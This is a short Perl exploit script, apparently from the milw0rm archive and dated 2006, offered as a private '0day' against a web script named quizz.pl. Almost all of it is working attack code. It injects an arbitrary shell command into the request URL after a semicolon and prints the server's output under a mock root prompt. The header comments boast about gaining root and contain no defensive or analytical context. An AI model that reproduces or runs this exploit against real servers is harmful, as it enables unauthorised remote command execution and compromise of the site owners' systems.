#!/usr/bin/perl
#
#  quizz.p exploit by FOX_MULDER (fox_mulder@abv.bg)
#
#  Vulnerability foud by WBYTE.
#
#  Born to be root !!!
#  
#  !!!!!!!!!!!!!!!THANKS to WBYTE !!!!!!!!!!!!!!!!!
#
#  FACT:Wbyte doesn't sleeps , he waits !.
#  0day
####################################################################################

use IO::Socket;
use LWP::Simple; 

sub Usage {
print STDERR "\nFOX_MULDER DID IT AGAIN !!!\n";
print STDERR "Usage:\nquiz.pl <www.example.com> </path/> \"cmd\"\n";
exit;
}

if (@ARGV < 3)
{
 Usage();
}


$host = @ARGV[0];
$path = @ARGV[1];
$command = @ARGV[2];
print "\n\n !!! PRIVATE PRIVATE PRIVATE !!! \n\n";
print "quizz.pl 0day Remote Command Execution Exploit by FOX_MULDER\n";

print "\n[+] Conecting to $host\n";
print "\n[+] Injecting command . . .\n\n";

my $result = get("http://$host$path/quizz.pl/ask/;$command|"); 

if (defined $result) { 
print "fox\@nasa# $result"; 
} 
else { 
print "Error with request.\n"; 
}

# milw0rm.com [2006-04-13]
